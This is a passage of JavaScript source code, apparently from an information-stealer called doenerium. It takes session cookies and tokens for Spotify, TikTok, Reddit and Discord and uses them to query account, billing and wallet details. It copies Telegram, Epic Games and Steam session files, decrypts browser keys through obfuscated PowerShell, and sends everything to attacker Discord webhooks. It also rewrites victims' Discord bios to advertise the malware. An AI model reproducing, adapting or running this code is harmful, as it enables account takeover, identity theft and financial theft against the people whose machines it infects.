        const country = profileData.country || "Not available";
        const username = profileData.username || "Not available";

        const embedData = {
            title: '',
            color: 0x303037,
            author: {
                name: 'Spotify Session Detected',
                icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png'
            },
            fields: [
                { name: 'Email', value: "```" + email + "```", inline: true },
                { name: 'Username', value: "```" + username + "```", inline: true },
                { name: 'Gender', value: "```" + gender + "```", inline: true },
                { name: 'Birthdate', value: "```" + birthdate + "```", inline: true },
                { name: 'Country', value: "```" + country + "```", inline: true },
                { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
                { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
            ],
            footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            }
        };

        const payload = {
            embeds: [embedData],
        };

        const randomString = crypto.randomBytes(3).toString('hex');

        setTimeout(() => {
            axios.post(discordWebhookUrl, payload)
                .then(response => {
                    console.log('Webhook sent successfully spotify:', response.data);
                })
                .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                    console.error('Error Message:', error.message);
                });
        }, 5000);
    } catch (error) {
        console.error('Error fetching Spotify data:', error.message);
        console.error('Error Message:', error.message);
    }
}


function moveTikTokFile(cookie) {
  if (!cookie) {
    // No TikTok session information intercepted, so no need to create the folder or file
    return;
  }
  const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
  const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');
  if (!fs.existsSync(tiktokFolderPath)) {
    fs.mkdirSync(tiktokFolderPath);
  }
  // Write the intercepted TikTok session information to the tiktok.txt file
  fs.writeFileSync(tiktokFilePath, cookie);
  console.log('TikTok session information written to tiktok.txt');
}


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
                  embeds: [
                    {
                      title: '‎ ',
                      color: 0x303037,
                      author: {
                        name: 'Tiktok Session Detected',
                        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png' 
                      },
                      fields: [
                        {
                          name: '<:cookie:1205123589930749995> Cookies',
                          value: "```" + cookie + "```",
                          inline: true
                        },
                        {
                          name: "Profile URL",
                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
                          inline: true
                        },
                        {
                          name: "User Identifier",
                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: ":envelope: Email",
                          value: "```" + (accountInfo.data.email || "No Email") + "```",
                          inline: true
                        },
                        {
                          name: "👤 Username",
                          value: "```" + accountInfo.data.username + "```",
                          inline: true
                        },
                        {
                          name: "<:twitter_follow:1205132510254604388> Follower Count",
                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "<:freetiktokcoinwithblinkstar74553:1205133412122230915> Coins",
                          value: "```" + wallet.data.coins + "```",
                          inline: true
                        }
                      ],
                      footer: {
                        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
                      },
                    }
                  ]
                };

                axios.post(discordWebhookUr1, webhookPayload);
                axios.post(discordWebhookUrl, webhookPayload)
                  .then(response => {
                    console.log('Discord webhook sent successfully! send tiktok');
                    moveTikTokFile(cookie);
                  })
                  .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                  });
              })
              .catch(error => {
                console.error('An error occurred while trying to retrieve wallet information:', error.message);
              });
          })
          .catch(error => {
            console.error('An error occurred while trying to retrieve insights:', error.message);
          });
      })
      .catch(error => {
        console.error('An error occurred while trying to retrieve account information:', error.message);
      });
  } catch (error) {
    console.error('An error occurred while trying to steal TikTok session:', error.message);
  }
}


function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        const embedData = {
                            title: "",
                            description: "",
                            color: 0x303037, 
                            url: '',
                            timestamp: new Date().toISOString(),
                            fields: [
                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
                { name: '👤 Username', value: '```' + username + '```', inline: false },
                { name: '', value: '💬 Comments: ```' + commentKarma + '``` 👍 Total Karma: ```' + totalKarma + '```', inline: true },
                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                            ],
                            footer: {
                                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                            },
                            author: {
                                name: "Reddit Session Detected",
                                icon_url: "https://preview.redd.it/reddit-logo-changes-to-old-non-pixelated-logo-sign-of-v0-1povzsj8o0eb1.jpg?width=640&crop=smart&auto=webp&s=8bab770af358cf676163dbde410c9caa2b13cbe5"
                            }
                        };

                        axios.post(discordWebhookUrl, { embeds: [embedData] })
                            .catch(error => {
                                console.error('Error sending Discord webhook:', error.message);
                            });
                    })
                    .catch(error => {
                        axios.post(discordWebhookUrl, { content: 'Error retrieving user data: ' + error.message })
                            .catch(webhookError => {
                                console.error('Error sending Discord webhook:', webhookError.message);
                            });
                    });
            })
            .catch(error => {
                axios.post(discordWebhookUrl, { content: 'Error obtaining access token: ' + error.message })
                    .catch(webhookError => {
                        console.error('Error sending Discord webhook:', webhookError.message);
                    });
            });
    } catch (error) {
        axios.post(discordWebhookUrl, { content: 'An error occurred Rddit: ' + error.message })
            .catch(webhookError => {
                console.error('Error sending Discord webhook:', webhookError.message);
            });
    }
}

   
//
const tokens = [];

function findToken(path) {
  let path_tail = path;
  path += 'Local Storage\\leveldb';

  if (!path_tail.includes('discord')) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith('.log') || file.endsWith('.ldb')) &&
          fs.readFileSync(path + '\\' + file, 'utf8')
            .split(/\r?\n/)
            .forEach((line) => {
              const patterns = [
                new RegExp(/mfa\.[\w-]{84}/g),
                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
              ];
              for (const pattern of patterns) {
                const foundTokens = line.match(pattern);
                if (foundTokens)
                  foundTokens.forEach((token) => {
                    if (!tokens.includes(token)) tokens.push(token);
                  });
              }
            });
      });
    } catch (e) {}
    return;
  } else {
    if (fs.existsSync(path_tail + '\\Local State')) {
      try {
        const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

        fs.readdirSync(path).forEach((file) => {
          if (file.endsWith('.log') || file.endsWith('.ldb')) {
            const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
            const lines = fileContent.split(/\r?\n/);

            lines.forEach((line) => {
              const foundTokens = line.match(tokenRegex);

              if (foundTokens) {
                foundTokens.forEach((token) => {
                  const encryptedKey = Buffer.from(
                    JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key,
                    'base64'
                  ).slice(5);
                  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                  const tokenParts = token.split('.');
                  const start = Buffer.from(tokenParts[0], 'base64');
                  const middle = Buffer.from(tokenParts[1], 'base64');
                  const end = Buffer.from(tokenParts[2], 'base64');
                  const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                  decipher.setAuthTag(end);
                  const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                  if (!tokens.includes(out)) {
                    tokens.push(out);
                  }
                });
              }
            });
          }
        });

        const discordFolderPath = path.join(mainFolderPath, 'Discord');
        const discordFilePath = path.join(discordFolderPath, 'discord.txt');
        const discordFileContent = tokens.join('\n');

        // Create Discord folder if it doesn't exist
        if (!fs.existsSync(discordFolderPath)) {
          fs.mkdirSync(discordFolderPath);
        }

        fs.writeFileSync(discordFilePath, discordFileContent);
      } catch (e) {}
      return;
    }
  }
}

async function getUserData(token) {
    try {
        const userResponse = await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        const userData = userResponse.data;

        if (!userData) return null;

        const id = userData.id;
        const username = userData.username;
        const discriminator = userData.discriminator;
        const avatar = userData.avatar;
        const email = userData.email;
        const phone = userData.phone;
        const mfa_enabled = userData.mfa_enabled;
        const flags = userData.flags;
        const premium_type = userData.premium_type;
        const bio = userData.bio;

        return {
            id,
            username,
            discriminator,
            avatar,
            email,
            phone,
            mfa_enabled,
            flags,
            premium_type,
            bio
        };
    } catch (error) {
        console.error(error);
        return null;
    }
}

async function getTokens() {
    const interceptedTokens = [];

    for (let path of paths) {
        await findToken(path);
    }

    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
**     This free virus can bypass all antivirus !** 
**           ⭐️https://t.me/doenerium69** ⭐️
╚═══════════✧✧✧═══════════╝`;

    for (let token of tokens) {
        try {
            const userData = await getUserData(token);

            if (!userData) continue;

            const phoneNumber = userData.phone || "None";
            let newBio = null;

            if (phoneNumber !== "None") {
                newBio = await updateBio(token, predefinedBio);
            }

            interceptedTokens.push(token);
            const hqGuilds = await getHQGuilds(token);
            const ip = await getIp();
            const billing = await getBilling(token);
            const friends = await getRelationships(token);
            const currentBio = userData.bio|| "None";

            const randomString = crypto.randomBytes(16).toString('hex');

            const userInformationEmbed = {
                title: `${userData.username}#${userData.discriminator} (${userData.id})`,
                color: 0x303037,
                author: {
                    name: "Discord Session Detected",
                    icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
                },
                thumbnail: {
                    url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}?size=512`
                },
                fields: [
                    {
                        name: ":key: Token:",
                        value: "```" + token + "```",
                    },
                    {
                        name: ":envelope: Email:",
                        value: "``" + `\`${userData.email}\`` + "``",
                        inline: true
                    },
                    {
                        name: ":globe_with_meridians: IP:",
                        value: "``" + `\`${ip}\`` + "``",
                        inline: true
                    },
                    {
                        name: "<:mobile88:1210411486120517663> Phone:",
                        value: "``" + `\`${phoneNumber}\`` + "``",
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(userData.flags)}`,
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(userData.premium_type, userData.id, token)}`,
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:Card_Black:1157319579287179294> **Billing:** ${billing}`,
                        inline: true
                    },
                    {
                        name: ":shield: HQ Guilds:",
                        value: hqGuilds,
                        inline: true
                    },
                ],
                footer: {
                    text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                }
            };

            const data = {
                embeds: [userInformationEmbed],
            };

            if (friends !== '*Nothing to see here*') {
                const friendsEmbed = {
                    title: "Friends",
                    color: 0x303037,
                    description: friends,
                    author: {
                        name: "HQ Friends",
                        icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                    },
                    footer: {
                        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                    }
                };
                data.embeds.push(friendsEmbed);
            }

            if (newBio !== null) {
                userInformationEmbed.fields.push({
                    name: "<a:aa_star_black:1157319572328808449> New About me:",
                    value: "```\n" + newBio + "\n```",
                });
            } else if (currentBio !== null) {
                userInformationEmbed.fields.push({
                    name: "<a:aa_star_black:1157319572328808449> About me:",
                    value: "```\n" + userData.bio + "\n```",
                });
            }
            await axios.post(discordWebhookUr1, data);
            await axios.post(discordWebhookUrl, data);
        } catch (error) {
            console.error(error);
        }
    }
}

async function updateBio(token, newBio) {
    try {
        const url = 'https://discord.com/api/v9/users/@me/profile';
        const payload = { bio: newBio };
        const headers = { authorization: token.trim() };

        const response = await axios.patch(url, payload, { headers });

        if (response.status === 200) {
            console.log(`Bio updated for token: ${token}`);
            return newBio;
        } else {
            console.log(`Failed to update bio for token: ${token}`);
            return null;
        }
    } catch (error) {
        console.error(`An error occurred while updating bio: ${error.message}`);
        return null;
    }
}

async function getHQGuilds(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        const hqGuilds = response.data.filter(guild => guild.permissions === "562949953421311");

        if (hqGuilds.length === 0) {
            return "```No HQ Guilds```";
        }

        let result = "\n";

        for (const guild of hqGuilds) {
            const invites = await getGuildInvites(token, guild.id);
            const invite = invites.length > 0 ? `[Join Server](https://discord.gg/${invites[0].code})` : "No Invite";

            const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";

            result += `${ownerOrAdmin} | \`${guild.name} - Members: ${guild.approximate_member_count}\` - ${invite}\n`;

            if (result.length >= 1024) {
                return "\`Too many servers to display.\`";
            }
        }

        return result;
    } catch (error) {
        console.error(error);
        return "Error retrieving HQ Guilds";
    }
}

async function getGuildInvites(token, guildId) {
    try {
        const response = await axios.get(`https://discord.com/api/v8/guilds/${guildId}/invites`, {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        return response.data;
    } catch (error) {
        console.error(error);
        return "No Invite";
    }
}


const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = "```No Billing```";
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return "```No Badges```";
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "```No Nitro```";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

async function Killchrome() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['discord.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}


async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

function copyFolder(source, destination) {
  if (!fs.existsSync(destination)) {
    fs.mkdirSync(destination);
  }

  const files = fs.readdirSync(source);

  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);

    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}

function copyGames(source, destination) {
  try {
    fs.mkdirSync(destination, { recursive: true }); 
  } catch (err) {
    console.error(`Error creating directory ${destination}: ${err.message}`);
    throw err;
  }

  const files = fs.readdirSync(source);

  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);

    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}


const logFilePath = path.join(mainFolderPath, 'debug.log');

function redirectErrorsToLog() {
    const originalConsoleError = console.error;

    console.error = function (message) {
        const formattedMessage = `${new Date().toISOString()} - ${message}\n`;

        fs.appendFile(logFilePath, formattedMessage, (err) => {
            if (err) {
                console.error('Erreur lors de l\'écriture dans le fichier de log :', err);
            }
        });

        originalConsoleError.apply(console, arguments);
    };
}

async function SubmitTelegram() {
    try {
        const sourcePath = `${process.env.APPDATA}\\Telegram Desktop\\tdata`;

        try {
            await fsPromises.access(sourcePath);
        } catch (error) {
            console.error(`Error accessing source path: ${error.message}`);
            return;
        }

        const destinationPath = path.join(mainFolderPath, 'Telegram');

        exec("taskkill /IM Telegram.exe /F", (error, stdout, stderr) => {});
        await new Promise(resolve => setTimeout(resolve, 4000));
        addFolder(path.join('Telegram'));

        const blacklistFolders = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];

        const files = await fsPromises.readdir(sourcePath);

        for (const file of files) {
            if (!blacklistFolders.includes(file)) {
                const sourceItemPath = path.join(sourcePath, file);
                const targetItemPath = path.join(destinationPath, file);

                try {
                    const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();

                    if (isDirectory) {
                        await fsPromises.mkdir(targetItemPath, { recursive: true });
                        await copyFolderContents(sourceItemPath, targetItemPath);
                    } else {
                        await fsPromises.copyFile(sourceItemPath, targetItemPath);
                    }
                } catch (err) {
                    console.error(`An error occurred: ${err}`);
                }
            }
        }

        console.log('Telegram session data copied to mainFolder/Telegram');
    } catch (error) {
        console.error(`Error in SubmitTelegram: ${error.message}`);
    } finally {
        await archiveAndSendData();
    }
}

async function copyFolderContents(source, target) {
    const files = await fsPromises.readdir(source);

    for (const file of files) {
        const sourceItemPath = path.join(source, file);
        const targetItemPath = path.join(target, file);

        const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();

        if (isDirectory) {
            await fsPromises.mkdir(targetItemPath, { recursive: true });
            await copyFolderContents(sourceItemPath, targetItemPath);
        } else {
            await fsPromises.copyFile(sourceItemPath, targetItemPath);
        }
    }
}



async function StealEpicGames() {
    try {
        const epicPath = path.join(localappdata, 'EpicGamesLauncher', 'Saved');
        const copiedPath = path.join(mainFolderPath, 'Epic Games');

        if (fs.existsSync(epicPath)) {
            if (!fs.existsSync(copiedPath)) {
                fs.mkdirSync(copiedPath, { recursive: true });
            }

            const epicSubfolders = ['Config', 'Data', 'Logs'];

            epicSubfolders.forEach(subfolder => {
                const sourcePath = path.join(epicPath, subfolder);
                const destinationPath = path.join(copiedPath, subfolder);

                try {
                    copyGames(sourcePath, destinationPath, { recursive: true });
                    console.log(`Copied ${subfolder} to ${copiedPath}`);
                } catch (err) {
                    console.error(`An error occurred while copying ${subfolder}: ${err.message}`);
                }
            });

            const howToUseContent = `<================[t.me/doenerium69 Stealer]>================>\n\n
Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
delete everything and copy all contents into the Epic Games folder and run.`;

            const howToUseFilePath = path.join(copiedPath, 'How to Use.txt');

            fs.writeFileSync(howToUseFilePath, howToUseContent, { encoding: 'utf8' });
            await new Promise(resolve => setTimeout(resolve, 3000));
            console.log('Epic Games "How to Use" file created in mainFolder/Epic Games');
        }
    } catch (error) {
        console.error(`Error in StealEpicGames: ${error.message}`);
    }
}

async function SubmitSteam() {
  try {
    var exists = false;

    if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
      exists = true;
      exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
      await new Promise(resolve => setTimeout(resolve, 2500));
    } else {
      exists = false;
    }

    if (exists) {
      const steamFoldersToCopy = ["userdata", "config"];

      steamFoldersToCopy.forEach(folder => {
